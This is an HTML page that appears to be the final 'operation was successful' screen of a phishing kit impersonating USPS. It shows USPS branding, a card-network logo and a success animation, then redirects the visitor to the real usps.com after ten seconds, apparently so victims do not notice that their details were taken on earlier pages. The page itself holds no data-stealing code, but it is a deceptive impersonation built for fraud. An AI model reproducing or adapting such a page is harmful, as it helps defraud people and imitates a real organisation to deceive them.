<!DOCTYPE html>
<!-- saved from url=(0042)/look/succes.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./../files/7_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./../files/7_files/font-awesome.min.css"> 
        <title>The operation was successful</title>
        <!-- logo site web-->
        <link rel="icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <link rel="shortcut icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./../files/7_files/bootstrap.css">
        <link rel="stylesheet" href="./../files/7_files/laylay.css">
</head>
<body>
        
        <div class="message succes">
            <div class="container">
                <div class="transfer shadow">
                    <div class="image">
                        <img src="./../files/7_files/pro_logo.svg">
                        <img src="./../files/7_files/vis.png">
                    </div>
                    <div class="text-center lban">
                        <img src="./../files/7_files/success_2.gif">
                    </div>
                    <div class="image sppp">
                        Copyright © 2022 USPS. All Rights Reserved.
                    </div>
                </div>
            </div>
        </div>

 

        <script src="./../files/7_files/jquery-3.5.1.min.js.téléchargement"></script>
        <script src="./../files/7_files/bootstrap.min.js.téléchargement"></script>
        <script>

           setTimeout(function () {
                window.location.href= 'https://www.usps.com/';
            },10000);

        </script>

<div id="torrent-scanner-popup" style="display: none;"></div></body></html>